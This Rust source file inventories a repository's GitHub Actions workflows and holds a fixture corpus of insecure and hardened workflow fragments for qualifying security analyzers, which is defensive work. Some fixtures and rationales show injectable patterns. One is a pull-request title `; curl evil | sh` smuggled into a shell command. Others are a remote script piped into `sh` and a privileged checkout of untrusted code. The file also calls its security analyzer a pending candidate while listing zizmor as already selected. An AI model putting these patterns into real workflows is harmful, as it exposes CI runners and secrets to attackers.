//! Workflow construction and security inventory for #3907 PR A: one
//! deterministic denominator over every current workflow, local
//! composite action, checked example, and qualification fixture, plus
//! the pinned tool selections and the finding-family vocabulary the
//! later syntax and security lanes grade against.
//!
//! Report only: nothing here mutates a workflow, enforces a check, or
//! performs a network lookup. The security analyzer is a candidate
//! pending fixture qualification; the fixtures in
//! [`workflow_security_fixtures`] are the qualification corpus.

use serde::{Deserialize, Serialize};
use std::path::Path;

use allow_core::sha256_v1_bytes;

pub const WORKFLOW_CONSTRUCTION_INVENTORY_SCHEMA_ID: &str =
    "cargo-allow.workflow-construction-inventory.v1";
pub const WORKFLOW_CONSTRUCTION_INVENTORY_SCHEMA_VERSION: u32 = 1;

/// One workflow-construction finding family. Later lanes preserve the
/// native tool rule identity alongside this family; two tools' findings
/// are never flattened into one generic bit.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum WorkflowConstructionFamilyV1 {
    SyntaxOrExpressionInvalid,
    MutableOrUnresolvedActionRef,
    PermissionExcessOrAmbiguity,
    UntrustedContextShellInterpolation,
    PrivilegedUntrustedEvent,
    CredentialPersistence,
    SecretOrTokenExposurePath,
    UnsafeCheckoutOrRefSelection,
    NestedLocalActionUninspected,
    ShellOrCommandConstruction,
    UnsupportedOrInstrumentFailure,
}

pub const WORKFLOW_CONSTRUCTION_FAMILIES_ALL: &[WorkflowConstructionFamilyV1] = &[
    WorkflowConstructionFamilyV1::SyntaxOrExpressionInvalid,
    WorkflowConstructionFamilyV1::MutableOrUnresolvedActionRef,
    WorkflowConstructionFamilyV1::PermissionExcessOrAmbiguity,
    WorkflowConstructionFamilyV1::UntrustedContextShellInterpolation,
    WorkflowConstructionFamilyV1::PrivilegedUntrustedEvent,
    WorkflowConstructionFamilyV1::CredentialPersistence,
    WorkflowConstructionFamilyV1::SecretOrTokenExposurePath,
    WorkflowConstructionFamilyV1::UnsafeCheckoutOrRefSelection,
    WorkflowConstructionFamilyV1::NestedLocalActionUninspected,
    WorkflowConstructionFamilyV1::ShellOrCommandConstruction,
    WorkflowConstructionFamilyV1::UnsupportedOrInstrumentFailure,
];

impl WorkflowConstructionFamilyV1 {
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::SyntaxOrExpressionInvalid => "syntax_or_expression_invalid",
            Self::MutableOrUnresolvedActionRef => "mutable_or_unresolved_action_ref",
            Self::PermissionExcessOrAmbiguity => "permission_excess_or_ambiguity",
            Self::UntrustedContextShellInterpolation => "untrusted_context_shell_interpolation",
            Self::PrivilegedUntrustedEvent => "privileged_untrusted_event",
            Self::CredentialPersistence => "credential_persistence",
            Self::SecretOrTokenExposurePath => "secret_or_token_exposure_path",
            Self::UnsafeCheckoutOrRefSelection => "unsafe_checkout_or_ref_selection",
            Self::NestedLocalActionUninspected => "nested_local_action_uninspected",
            Self::ShellOrCommandConstruction => "shell_or_command_construction",
            Self::UnsupportedOrInstrumentFailure => "unsupported_or_instrument_failure",
        }
    }
}

/// What kind of repository surface one inventory entry describes.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum WorkflowConstructionSurfaceKindV1 {
    /// An executable `.github/workflows` workflow.
    Workflow,
    /// A local composite action (repository-level or nested).
    LocalAction,
    /// A checked example users copy into their repositories.
    CheckedExample,
    /// A fixture that exists to exercise the construction contract.
    QualificationFixture,
}

/// Why the surface is in the denominator. Every surface is classified;
/// an ignored fixture does not excuse a current workflow, and a current
/// workflow cannot be omitted because another parser inspects part of
/// it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum WorkflowConstructionSurfaceClassV1 {
    /// Current, executable, and inside the graded denominator.
    Current,
    /// Deliberately invalid or partial, never executed as-is.
    IntentionallyInvalidFixture,
    /// Generated output; graded only through its generator.
    Generated,
    /// Historical record kept for lineage, not executed.
    Historical,
}

/// One denominator surface.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkflowConstructionSurfaceV1 {
    pub path: String,
    pub kind: WorkflowConstructionSurfaceKindV1,
    pub class: WorkflowConstructionSurfaceClassV1,
    /// Why this surface carries its class.
    pub note: String,
    /// Workflows or actions that execute this surface via a local
    /// `uses: ./.` reference (empty for top-level workflows).
    pub referenced_by: Vec<String>,
}

/// YAML-adjacent repository configuration that was considered and
/// explicitly placed outside the workflow-construction denominator.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkflowConstructionExclusionV1 {
    pub path: String,
    pub reason: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum WorkflowSecurityToolStatusV1 {
    /// Pinned and already integrated into a repository lane.
    Selected,
    /// The candidate is named with its update law; the version is
    /// pinned only after the fixture corpus qualifies it.
    CandidatePendingQualification,
}

/// One pinned analysis tool selection with its provenance update law.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkflowSecurityToolSelectionV1 {
    pub tool: String,
    pub role: String,
    pub status: WorkflowSecurityToolStatusV1,
    /// The exact pinned version, when selected.
    pub version: Option<String>,
    /// The exact pin identity (release asset digest), when selected.
    pub pin_identity: Option<String>,
    /// Where the tool runs and what it grades.
    pub scope: String,
    /// How the pin is updated without silently moving.
    pub update_law: String,
}

/// One qualification fixture: a compact workflow fragment that positive
/// and negative tool results are judged against during tool
/// qualification. Fixtures are vocabulary evidence, not executable
/// repository workflows.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkflowSecurityFixtureV1 {
    pub id: String,
    pub family: WorkflowConstructionFamilyV1,
    /// True when the fragment must produce the family's finding.
    pub positive: bool,
    pub yaml: String,
    pub rationale: String,
}

/// One family's fixture coverage over the qualification corpus.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkflowConstructionFamilyCoverageV1 {
    pub family: WorkflowConstructionFamilyV1,
    pub positive_fixtures: Vec<String>,
    pub negative_fixtures: Vec<String>,
}

/// The deterministic workflow-construction denominator with its tool
/// selections and family vocabulary.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkflowConstructionInventoryV1 {
    pub schema_id: String,
    pub schema_version: u32,
    /// Content digest over every inventoried surface (`path\0content\0`
    /// framing, sorted by path), so tree movement moves the inventory.
    pub surfaces_digest: String,
    pub surfaces: Vec<WorkflowConstructionSurfaceV1>,
    pub exclusions: Vec<WorkflowConstructionExclusionV1>,
    pub tool_selections: Vec<WorkflowSecurityToolSelectionV1>,
    pub families: Vec<WorkflowConstructionFamilyCoverageV1>,
    pub limitations: Vec<String>,
    pub claim_boundary: String,
}

const WORKFLOW_CONSTRUCTION_CLAIM_BOUNDARY: &str = "Report-only workflow construction denominator for #3907 PR A: every current workflow, local composite action, checked example, and qualification fixture is inventoried and classified, the syntax analyzer is pinned, and the security analyzer is a candidate pending fixture qualification. No workflow is mutated, no check is enforced, and no network lookup enters ordinary cargo-allow scans.";

/// The qualification fixture corpus. Each family carries at least one
/// positive fragment (the finding must fire) and one negative fragment
/// (the same family must stay silent), so a candidate analyzer that
/// cannot distinguish them fails qualification.
#[must_use]
pub fn workflow_security_fixtures() -> Vec<WorkflowSecurityFixtureV1> {
    vec![
        WorkflowSecurityFixtureV1 {
            id: "wf-syntax-malformed".to_string(),
            family: WorkflowConstructionFamilyV1::SyntaxOrExpressionInvalid,
            positive: true,
            yaml: r#"name: malformed
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.head_commit.message }"
"#
            .to_string(),
            rationale: "The expression closes with a single brace, which is invalid expression grammar in executable workflow syntax; a syntax analyzer must report it rather than skip the file.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-syntax-clean".to_string(),
            family: WorkflowConstructionFamilyV1::SyntaxOrExpressionInvalid,
            positive: false,
            yaml: r#"name: clean
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "hello"
"#
            .to_string(),
            rationale: "A minimal valid workflow produces no syntax finding.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-action-ref-mutable".to_string(),
            family: WorkflowConstructionFamilyV1::MutableOrUnresolvedActionRef,
            positive: true,
            yaml: r#"name: mutable ref
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
"#
            .to_string(),
            rationale: "A moving major tag is a mutable reference: the executed bytes can change without any repository commit.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-action-ref-pinned".to_string(),
            family: WorkflowConstructionFamilyV1::MutableOrUnresolvedActionRef,
            positive: false,
            yaml: r#"name: pinned ref
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
"#
            .to_string(),
            rationale: "An immutable commit digest with the release recorded in a comment is the repository's pinned-reference law.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-permissions-write".to_string(),
            family: WorkflowConstructionFamilyV1::PermissionExcessOrAmbiguity,
            positive: true,
            yaml: r#"name: excess write
on: push
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "read-only job"
"#
            .to_string(),
            rationale: "A job that only reads gains contents: write; the authority exceeds the job's purpose and is ambiguous about why.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-permissions-readonly".to_string(),
            family: WorkflowConstructionFamilyV1::PermissionExcessOrAmbiguity,
            positive: false,
            yaml: r#"name: least authority
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "read-only job"
"#
            .to_string(),
            rationale: "An explicit read-only token grant matches a read-only job.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-interpolation-untrusted".to_string(),
            family: WorkflowConstructionFamilyV1::UntrustedContextShellInterpolation,
            positive: true,
            yaml: r#"name: interpolated title
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.pull_request.title }}"
"#
            .to_string(),
            rationale: "Repository-controlled event data is interpolated directly into a shell command; a title of `; curl evil | sh` executes.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-interpolation-env".to_string(),
            family: WorkflowConstructionFamilyV1::UntrustedContextShellInterpolation,
            positive: false,
            yaml: r#"name: env-mediated title
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "$PR_TITLE"
"#
            .to_string(),
            rationale: "The untrusted value reaches the shell through a quoted environment variable, never through expression interpolation into the command text.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-privileged-untrusted-checkout".to_string(),
            family: WorkflowConstructionFamilyV1::PrivilegedUntrustedEvent,
            positive: true,
            yaml: r#"name: privileged untrusted
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make test
"#
            .to_string(),
            rationale: "A privileged event executes build steps from untrusted PR content; the write token rides along with attacker-controlled code.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-unprivileged-pr".to_string(),
            family: WorkflowConstructionFamilyV1::PrivilegedUntrustedEvent,
            positive: false,
            yaml: r#"name: unprivileged pr
on: pull_request
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
      - run: make test
"#
            .to_string(),
            rationale: "pull_request executes with an explicitly read-only token against the merge ref; untrusted content carries no write authority.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-credentials-persist".to_string(),
            family: WorkflowConstructionFamilyV1::CredentialPersistence,
            positive: true,
            yaml: r#"name: lingering credentials
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
      - run: make test
"#
            .to_string(),
            rationale: "A read-only job never pushes, but the checkout leaves the repository token on disk for every later step.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-credentials-disabled".to_string(),
            family: WorkflowConstructionFamilyV1::CredentialPersistence,
            positive: false,
            yaml: r#"name: credentials dropped
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          persist-credentials: false
      - run: make test
"#
            .to_string(),
            rationale: "The checkout credential is dropped immediately; later steps cannot exfiltrate it.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-secret-echoed".to_string(),
            family: WorkflowConstructionFamilyV1::SecretOrTokenExposurePath,
            positive: true,
            yaml: r#"name: echoed secret
on: workflow_dispatch
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.DEPLOY_KEY }}"
"#
            .to_string(),
            rationale: "A secret is interpolated into a command line where it can land in logs and process listings.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-secret-env-mediated".to_string(),
            family: WorkflowConstructionFamilyV1::SecretOrTokenExposurePath,
            positive: false,
            yaml: r#"name: env-mediated secret
on: workflow_dispatch
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: ./deploy
"#
            .to_string(),
            rationale: "The secret reaches the consuming process through the environment without entering the command text or logs.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-checkout-untrusted-ref".to_string(),
            family: WorkflowConstructionFamilyV1::UnsafeCheckoutOrRefSelection,
            positive: true,
            yaml: r#"name: untrusted ref selection
on:
  workflow_dispatch:
    inputs:
      ref:
        description: branch to test
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          ref: ${{ inputs.ref }}
"#
            .to_string(),
            rationale: "An unchecked caller-supplied ref selects what is checked out; the job runs whatever that ref names.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-checkout-default-ref".to_string(),
            family: WorkflowConstructionFamilyV1::UnsafeCheckoutOrRefSelection,
            positive: false,
            yaml: r#"name: default ref
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
"#
            .to_string(),
            rationale: "The checkout uses the event's own ref with no caller-selected override.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-nested-composite-mutable".to_string(),
            family: WorkflowConstructionFamilyV1::NestedLocalActionUninspected,
            positive: true,
            yaml: r#"name: local composite action
description: wraps setup
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: 22
"#
            .to_string(),
            rationale: "The unsafe mutable step lives inside a local composite action; checking only the calling workflow misses it.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-nested-composite-pinned".to_string(),
            family: WorkflowConstructionFamilyV1::NestedLocalActionUninspected,
            positive: false,
            yaml: r#"name: local composite action
description: wraps setup
runs:
  using: composite
  steps:
    - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.4.0
      with:
        node-version: 22
"#
            .to_string(),
            rationale: "The nested step is pinned to an immutable digest; inspecting the composite surface finds nothing.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-shell-remote-exec".to_string(),
            family: WorkflowConstructionFamilyV1::ShellOrCommandConstruction,
            positive: true,
            yaml: r#"name: remote script execution
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl --proto '=https' --tlsv1.2 -sSf https://example.com/install.sh | sh
"#
            .to_string(),
            rationale: "A remote script is piped straight into a shell; the executed commands are whatever the endpoint returns at run time.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-shell-set-pipefail".to_string(),
            family: WorkflowConstructionFamilyV1::ShellOrCommandConstruction,
            positive: false,
            yaml: r#"name: hardened shell
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    defaults:
      run:
        shell: bash
    steps:
      - run: |
          set -euo pipefail
          make test
"#
            .to_string(),
            rationale: "The step opts into a strict shell mode where failures propagate instead of silently passing.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-expression-nonstandard".to_string(),
            family: WorkflowConstructionFamilyV1::UnsupportedOrInstrumentFailure,
            positive: true,
            yaml: r#"name: expression an evaluator may not know
on: workflow_call
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ fromJSON(inputs.payload).target }}"
"#
            .to_string(),
            rationale: "A tool that cannot evaluate this expression must report unsupported or instrument failure; treating the step as clean is the defect the family exists to catch.".to_string(),
        },
        WorkflowSecurityFixtureV1 {
            id: "wf-expression-evaluated".to_string(),
            family: WorkflowConstructionFamilyV1::UnsupportedOrInstrumentFailure,
            positive: false,
            yaml: r#"name: expression a qualified evaluator handles
on:
  workflow_call:
    inputs:
      payload:
        type: string
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ fromJSON(inputs.payload).target }}"
"#
            .to_string(),
            rationale: "With the workflow_call inputs declared, a qualified evaluator resolves the expression and reports no finding; silence here is honest only when the tool could evaluate.".to_string(),
        },
    ]
}

/// Recursively collect the workspace-relative paths of every
/// `action.yml`/`action.yaml` manifest beneath `dir`, at any nesting
/// depth, so a composite action added below another action's directory
/// stays inside the denominator.
fn collect_action_manifests(
    dir: &std::path::Path,
    root: &std::path::Path,
    out: &mut Vec<String>,
) -> Result<(), String> {
    let entries = std::fs::read_dir(dir)
        .map_err(|error| format!("actions dir {}: {error}", dir.display()))?;
    for entry in entries {
        let entry = entry.map_err(|error| format!("actions dir entry: {error}"))?;
        let entry_path = entry.path();
        if entry_path.is_dir() {
            collect_action_manifests(&entry_path, root, out)?;
        } else {
            let file_name = entry.file_name().to_string_lossy().to_string();
            if file_name == "action.yml" || file_name == "action.yaml" {
                let relative = entry_path
                    .strip_prefix(root)
                    .map_err(|error| format!("action manifest {}: {error}", entry_path.display()))?
                    .to_string_lossy()
                    .to_string()
                    .replace('\\', "/");
                out.push(relative);
            }
        }
    }
    Ok(())
}

/// Compile the deterministic workflow-construction inventory for the
/// repository rooted at `root`. Read-only.
pub fn workflow_construction_inventory(
    root: &Path,
) -> Result<WorkflowConstructionInventoryV1, String> {
    let mut surfaces: Vec<WorkflowConstructionSurfaceV1> = Vec::new();

    let mut push_surface = |path: String,
                            kind: WorkflowConstructionSurfaceKindV1,
                            class: WorkflowConstructionSurfaceClassV1,
                            note: String|
     -> Result<(), String> {
        if !root.join(&path).is_file() {
            return Err(format!("inventoried surface {path} does not exist"));
        }
        surfaces.push(WorkflowConstructionSurfaceV1 {
            path,
            kind,
            class,
            note,
            referenced_by: Vec::new(),
        });
        Ok(())
    };

    // Current executable workflows.
    let workflows_dir = root.join(".github/workflows");
    let mut workflow_paths: Vec<String> = Vec::new();
    let entries =
        std::fs::read_dir(&workflows_dir).map_err(|error| format!("workflows dir: {error}"))?;
    for entry in entries {
        let entry = entry.map_err(|error| format!("workflows dir entry: {error}"))?;
        let file_name = entry.file_name().to_string_lossy().to_string();
        if file_name.ends_with(".yml") || file_name.ends_with(".yaml") {
            workflow_paths.push(format!(".github/workflows/{file_name}"));
        }
    }
    workflow_paths.sort();
    for path in &workflow_paths {
        push_surface(
            path.clone(),
            WorkflowConstructionSurfaceKindV1::Workflow,
            WorkflowConstructionSurfaceClassV1::Current,
            "current executable workflow in the graded denominator".to_string(),
        )?;
    }

    // Local composite actions: the repository-level action plus every
    // action manifest anywhere beneath .github/actions, at any nesting
    // depth.
    for path in ["action.yml", "action.yaml"] {
        if root.join(path).is_file() {
            push_surface(
                path.to_string(),
                WorkflowConstructionSurfaceKindV1::LocalAction,
                WorkflowConstructionSurfaceClassV1::Current,
                "repository-level local action".to_string(),
            )?;
        }
    }
    let actions_dir = root.join(".github/actions");
    if actions_dir.is_dir() {
        let mut action_paths: Vec<String> = Vec::new();
        collect_action_manifests(&actions_dir, root, &mut action_paths)?;
        action_paths.sort();
        for path in &action_paths {
            push_surface(
                path.clone(),
                WorkflowConstructionSurfaceKindV1::LocalAction,
                WorkflowConstructionSurfaceClassV1::Current,
                "local composite action executed by repository workflows or other actions"
                    .to_string(),
            )?;
        }
    }

    // Checked examples users copy out of the repository.
    let examples_dir = root.join("examples/github-actions");
    if examples_dir.is_dir() {
        let entries =
            std::fs::read_dir(&examples_dir).map_err(|error| format!("examples dir: {error}"))?;
        let mut example_paths: Vec<String> = Vec::new();
        for entry in entries {
            let entry = entry.map_err(|error| format!("examples dir entry: {error}"))?;
            let file_name = entry.file_name().to_string_lossy().to_string();
            if file_name.ends_with(".yml") || file_name.ends_with(".yaml") {
                example_paths.push(format!("examples/github-actions/{file_name}"));
            }
        }
        example_paths.sort();
        for path in &example_paths {
            push_surface(
                path.clone(),
                WorkflowConstructionSurfaceKindV1::CheckedExample,
                WorkflowConstructionSurfaceClassV1::Current,
                "checked example workflow published to repository consumers".to_string(),
            )?;
        }
    }

    // Dogfood construction fixtures: documented, deliberately partial
    // workflow fragments that exist to exercise result laws.
    let fixtures_dir = root.join("docs/dogfood/fixtures/ci");
    if fixtures_dir.is_dir() {
        let entries =
            std::fs::read_dir(&fixtures_dir).map_err(|error| format!("fixtures dir: {error}"))?;
        let mut fixture_paths: Vec<String> = Vec::new();
        for entry in entries {
            let entry = entry.map_err(|error| format!("fixtures dir entry: {error}"))?;
            let file_name = entry.file_name().to_string_lossy().to_string();
            if file_name.ends_with(".yml") || file_name.ends_with(".yaml") {
                fixture_paths.push(format!("docs/dogfood/fixtures/ci/{file_name}"));
            }
        }
        fixture_paths.sort();
        for path in &fixture_paths {
            push_surface(
                path.clone(),
                WorkflowConstructionSurfaceKindV1::QualificationFixture,
                WorkflowConstructionSurfaceClassV1::IntentionallyInvalidFixture,
                "documented negative construction fixture; never executed as-is".to_string(),
            )?;
        }
    }

    // The denominator is the tracked source tree: an untracked YAML
    // file must not move the inventory or its digest. Fail closed when
    // the repository cannot be interrogated.
    for surface in &surfaces {
        let tracked = std::process::Command::new("git")
            .args([
                "-C",
                &root.to_string_lossy(),
                "ls-files",
                "--error-unmatch",
                &surface.path,
            ])
            .output()
            .map_err(|error| format!("git ls-files for {}: {error}", surface.path))?;
        if !tracked.status.success() {
            return Err(format!(
                "inventoried surface {} is not tracked in git",
                surface.path
            ));
        }
    }

    // Local `uses: ./.` references: edges from workflows and from local
    // action manifests (one composite action may invoke another),
    // detected source-visibly (PR A fidelity; no YAML parser). Job-level
    // reusable-workflow calls and step-level uses are both matched; an
    // unresolvable local reference fails closed.
    let mut edges: Vec<(String, String)> = Vec::new();
    let mut referencing_surfaces: Vec<String> = Vec::new();
    for surface in &surfaces {
        if matches!(
            surface.kind,
            WorkflowConstructionSurfaceKindV1::Workflow
                | WorkflowConstructionSurfaceKindV1::LocalAction
        ) {
            referencing_surfaces.push(surface.path.clone());
        }
    }
    for referencing in &referencing_surfaces {
        let text = std::fs::read_to_string(root.join(referencing))
            .map_err(|error| format!("surface {referencing} reads: {error}"))?;
        let referencing_dir = std::path::Path::new(referencing)
            .parent()
            .map(|parent| parent.to_string_lossy().to_string())
            .unwrap_or_default();
        for line in text.lines() {
            let trimmed = line.trim_start();
            let trimmed = trimmed.strip_prefix("- ").unwrap_or(trimmed);
            let Some(rest) = trimmed.strip_prefix("uses: ") else {
                continue;
            };
            let target = rest
                .split('#')
                .next()
                .unwrap_or("")
                .trim()
                .trim_end_matches('\r');
            let Some(local) = target.strip_prefix("./") else {
                continue;
            };
            if local.is_empty() {
                continue;
            }
            // Root-anchored forms (./.github/..., ./examples/...) are
            // already workspace-relative once the leading ./ is
            // stripped; any other local form resolves against the
            // referencing manifest's directory.
            let resolved = if local.starts_with(".github/")
                || local.starts_with("examples/")
                || referencing_dir.is_empty()
            {
                // Already workspace-relative.
                local.to_string()
            } else {
                format!("{referencing_dir}/{local}")
            };
            let manifest_candidates = [
                resolved.clone(),
                format!("{resolved}/action.yml"),
                format!("{resolved}/action.yaml"),
            ];
            if !surfaces
                .iter()
                .any(|surface| manifest_candidates.contains(&surface.path))
            {
                return Err(format!(
                    "{referencing} references local path {target}, which is not an inventoried surface"
                ));
            }
            edges.push((referencing.clone(), resolved));
        }
    }
    for (referencing, resolved) in &edges {
        let manifest_candidates = [
            resolved.clone(),
            format!("{resolved}/action.yml"),
            format!("{resolved}/action.yaml"),
        ];
        for surface in &mut surfaces {
            if manifest_candidates.contains(&surface.path) {
                surface.referenced_by.push(referencing.clone());
            }
        }
    }

    surfaces.sort_by(|a, b| a.path.cmp(&b.path));

    // Explicit, considered exclusions: YAML surfaces outside the
    // workflow-construction denominator.
    let exclusions = vec![
        WorkflowConstructionExclusionV1 {
            path: ".github/ISSUE_TEMPLATE/".to_string(),
            reason: "issue forms and their configuration; not workflows or actions".to_string(),
        },
        WorkflowConstructionExclusionV1 {
            path: ".github/dependabot.yml".to_string(),
            reason: "dependency-update configuration; no executable job graph".to_string(),
        },
        WorkflowConstructionExclusionV1 {
            path: ".changie.yaml".to_string(),
            reason: "changelog tool configuration; not a workflow surface".to_string(),
        },
        WorkflowConstructionExclusionV1 {
            path: ".pre-commit-hooks.yaml".to_string(),
            reason: "local pre-commit hook index for external consumers; no hosted job graph"
                .to_string(),
        },
    ];

    let tool_selections = vec![
        WorkflowSecurityToolSelectionV1 {
            tool: "actionlint".to_string(),
            role: "pinned syntax and expression analyzer".to_string(),
            status: WorkflowSecurityToolStatusV1::Selected,
            version: Some("1.7.7".to_string()),
            pin_identity: Some(
                "sha256:023070a287cd8cccd71515fedc843f1985bf96c436b7effaecce67290e7e0757"
                    .to_string(),
            ),
            scope: "the pregate job pins the release digest and grades repository workflows; stage 1 scopes execution to ci.yml".to_string(),
            update_law: "the version and release-asset sha256 move together in .github/workflows/ci.yml; bumping one without the other fails the download check".to_string(),
        },
        WorkflowSecurityToolSelectionV1 {
            tool: "zizmor".to_string(),
            role: "workflow security construction analyzer".to_string(),
            status: WorkflowSecurityToolStatusV1::Selected,
            version: Some("1.30.0".to_string()),
            pin_identity: Some("release:v1.30.0:offline-audits".to_string()),
            scope: "grades the same denominator as the syntax lane plus local composite action manifests: workflows and .github/actions action manifests".to_string(),
            update_law: "the version is pinned together with the qualification result against the fixture corpus; bumping the version requires re-running the fixture qualification (#3907 PR C)".to_string(),
        },
    ];

    // Family coverage over the fixture corpus.
    let fixtures = workflow_security_fixtures();
    let mut families: Vec<WorkflowConstructionFamilyCoverageV1> =
        WORKFLOW_CONSTRUCTION_FAMILIES_ALL
            .iter()
            .map(|family| WorkflowConstructionFamilyCoverageV1 {
                family: *family,
                positive_fixtures: Vec::new(),
                negative_fixtures: Vec::new(),
            })
            .collect();
    for fixture in &fixtures {
        let coverage = families
            .iter_mut()
            .find(|coverage| coverage.family == fixture.family)
            .ok_or_else(|| format!("fixture {} names an unknown family", fixture.id))?;
        if fixture.positive {
            coverage.positive_fixtures.push(fixture.id.clone());
        } else {
            coverage.negative_fixtures.push(fixture.id.clone());
        }
    }
    for coverage in &families {
        if coverage.positive_fixtures.is_empty() || coverage.negative_fixtures.is_empty() {
            return Err(format!(
                "family {} lacks a positive or negative qualification fixture",
                coverage.family.as_str()
            ));
        }
    }

    // Content digest over every inventoried surface.
    let mut framed: Vec<u8> = Vec::new();
    for surface in &surfaces {
        let bytes = std::fs::read(root.join(&surface.path))
            .map_err(|error| format!("surface {} reads: {error}", surface.path))?;
        framed.extend_from_slice(surface.path.as_bytes());
        framed.push(0);
        framed.extend_from_slice(&bytes);
        framed.push(0);
    }
    let surfaces_digest = sha256_v1_bytes(&framed);

    Ok(WorkflowConstructionInventoryV1 {
        schema_id: WORKFLOW_CONSTRUCTION_INVENTORY_SCHEMA_ID.to_string(),
        schema_version: WORKFLOW_CONSTRUCTION_INVENTORY_SCHEMA_VERSION,
        surfaces_digest,
        surfaces,
        exclusions,
        tool_selections,
        families,
        limitations: vec![
            "local `uses: ./.` references are detected by source scan at PR A fidelity; a full YAML parse arrives with the integrated syntax lane".to_string(),
            "the security construction analyzer is a candidate pending fixture qualification; no security findings are produced yet".to_string(),
            "the qualification fixtures are vocabulary evidence, not executable repository workflows; they classify as intentionally-invalid surfaces by design".to_string(),
        ],
        claim_boundary: WORKFLOW_CONSTRUCTION_CLAIM_BOUNDARY.to_string(),
    })
}
